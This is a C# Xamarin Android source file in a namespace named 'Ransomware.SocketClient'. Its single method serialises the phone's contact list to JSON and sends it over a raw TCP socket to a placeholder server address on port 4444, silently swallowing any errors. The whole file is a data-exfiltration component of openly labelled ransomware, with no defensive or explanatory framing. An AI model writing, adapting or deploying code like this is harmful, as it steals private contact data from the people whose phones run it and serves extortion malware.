using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using System.Net;
using System.Net.Sockets;
using Newtonsoft.Json;

namespace Ransomware.SocketClient
{
    public static class Client
    {
        //Se enviara la lista de contactos que se ingrese por medio de socket
        public static void Conectar(List<ContactData> contacts)
        {
            try
            {
                byte[] objetosJson = new byte[255];
                string obj = JsonConvert.SerializeObject(contacts);
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint srvIP = new IPEndPoint(IPAddress.Parse("IP-SERVER"), 4444);

                socket.Connect(srvIP);
                Console.WriteLine("Conexion Exitosa");
                objetosJson = Encoding.Default.GetBytes(obj);
                socket.Send(objetosJson);
                socket.Close();
            }
            catch
            {

            }
        }
    }
}